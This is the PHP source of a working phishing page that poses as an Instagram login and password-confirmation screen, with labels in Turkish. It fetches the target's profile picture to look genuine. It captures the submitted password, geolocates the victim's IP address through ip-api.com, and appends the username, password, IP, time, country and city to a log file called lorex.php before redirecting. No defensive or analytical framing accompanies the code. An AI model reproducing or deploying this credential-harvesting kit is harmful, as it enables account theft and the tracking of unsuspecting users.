<?php
require 'load.php';
session_start();
set_time_limit(0);
error_reporting(E_ALL);

$lorex=$_GET['nick'];
$url2="https://smihub.com/search?query=$lorex";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
  $password=$_POST["instapass"];
  $mail=$_POST["mailadress"];
  $mailpass=$_POST["mailpass"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $cek = new SimpleXMLElement($konum);
  $ulke = $cek->country;
  $sehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $cur_time=date("d-m-Y H:i:s");
  include('vendor/autoload.php');
  $file = fopen('lorex.php', 'a');
  fwrite($file, "
    <html>
    <head>
    <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    </head>
    <body bgcolor='#000000'>
    <body bgcolor='rgb(0,0,0)'>
    <body bgcolor='black'>
    <hr>
    <font color='red'>Kullanıcı Adı: </font><font color='white'>".$lorex."</font><br>
    <font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
    <font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
    <font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
    <font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
    <font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
    <hr>
    <br>

    ");
  fclose($file);


  header("location: confirmed.php?nick=$lorex");
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Instagram | Login</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!--===============================================================================================-->
  <link rel="icon" type="image/png" href="favicon.png"/>
  <!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
  <!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
  <!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
  <!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">
  <!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
  <!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="css/util.css">
  <link rel="stylesheet" type="text/css" href="css/main.css">
  <!--===============================================================================================-->
</head>
<style type="text/css">
 <style>
 img {
  border: 1px solid #ddd;
  border-radius: 4px;
  padding: 5px;
  width: 150px;
}
.overlay{
  display: none;
  position: fixed;
  width: 100%;
  height: 100%;
  top: 0;
  left: 0;
  z-index: 999;

}
/* Turn off scrollbar when body element has the loading class */
body.loading{
  overflow: hidden;
}
/* Make spinner image visible when body element has the loading class */
body.loading .overlay{
  display: block;
}
</style>
<style type="text/css">  .btn {
  cursor: pointer;
  width: 100%;
  padding:0 8px;
  background: #3897f0;
  border:1px solid #3897f0;
  color:#fff;
  border-radius:10px;
  font-weight:600;
  font-size: 14px;
  height: 35px;
  line-height: 26px;
  outline: none;
  white-space: nowrap;
}
</style>
<body><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
  <div class="limiter">
   <div class="container-login100">
    <div class="wrap-login100">
     <div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
      <img src="https://www.vargonen.com/blog/wp-content/uploads/2020/09/instagramlogo.jpg" alt="IMG"> <br><br><br><br>
    </div>
    <el class="login100-form validate-form" id="elemend">
      <form autocomplete="off" id="foo" method="post">
       <center><img width="140" height="40" src="https://www.pngkey.com/png/full/2-28310_instagram-logo-black-and-ahite-instagram-word-logo.png"></center><br>

       <center>  <img src=" <?php  echo  $pp; ?>" style="max-width:90%; border-radius:50%;" width="200" height="200">
       </center>
       <hr>
       <center><h3>@<?php echo $lorex ?>  </h3></center>
       <hr>
       <input type="hidden" name="instauser" value="pharaben">
       <div class="wrap-input100 validate-input"> <input class="input100" type="password" required="" name="instapass" placeholder="Password"> <span class="focus-input100"></span> <span class="symbol-input100"> <i class="fa fa-lock" aria-hidden="true"></i> </span> </div>

       

       <button type="submit" value="Giriş Yap" id="df" class="btn">Confirm</button> <br> <br>
       <durum id="statuss"></durum>

       <br><br>
     </form>
   </el>
 </div>
</div>
</div>
<!--===============================================================================================-->
<script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
<script src="css/vendor/bootstrap/js/popper.js"></script>
<script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
<script src="css/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
<script src="css/vendor/tilt/tilt.jquery.min.js"></script>
<script >
 $('.js-tilt').tilt({
   scale: 1.1
 })
</script>
<!--===============================================================================================-->
<script src="css/js/main.js"></script>

</body>
</html>
